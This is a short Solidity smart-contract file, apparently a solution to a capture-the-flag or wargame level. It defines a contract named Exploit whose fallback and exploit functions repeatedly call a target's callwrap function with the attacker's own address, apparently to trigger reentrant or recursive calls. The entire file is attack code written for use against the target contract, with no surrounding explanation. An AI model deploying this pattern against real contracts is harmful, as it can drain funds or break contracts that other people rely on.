contract Exploit {
    ICallWrapper target;

    constructor(address _target) {
        target = ICallWrapper(_target);
    }

    fallback() external payable {
        target.callwrap(address(this));
    }

    function exploit() public payable {
        target.callwrap(address(this));
    }
}

interface ICallWrapper {
    function callwrap(address called) external;
}